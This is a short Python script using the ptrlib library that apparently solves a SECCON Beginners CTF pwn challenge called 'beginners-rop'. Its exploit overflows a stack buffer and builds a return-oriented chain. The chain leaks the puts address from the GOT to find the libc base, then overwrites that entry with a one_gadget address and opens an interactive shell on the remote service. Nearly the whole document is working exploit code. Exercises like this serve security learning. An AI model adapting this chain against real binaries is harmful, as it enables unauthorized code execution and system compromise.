from ptrlib import *

sock = Socket("nc beginners-rop.quals.beginners.seccon.jp 4102")
#sock = Process("./chall")
elf = ELF("./chall")
libc = ELF("./libc-2.27.so")


gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

#libc_base = 0x7ffff79e2000
pop_rdi = 0x00401283
puts_plt = elf.plt("puts")
puts_got = elf.got("puts")
gets_plt = elf.plt("gets")
main_func = 0x401196

payload = b"A"*264
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(gets_plt)

payload += p64(puts_plt)

sock.sendline(payload)
print(sock.recvline()) # return input str
libc_base = u64(sock.recvline()) - 0x80aa0 # puts got leak
print(hex(libc_base))

rce = libc_base + gadgets[1]
sock.sendline(p64(rce))

#system = libc_base + 0x4f550
#binsh = libc_base + 0x1b3e1a

sock.interactive()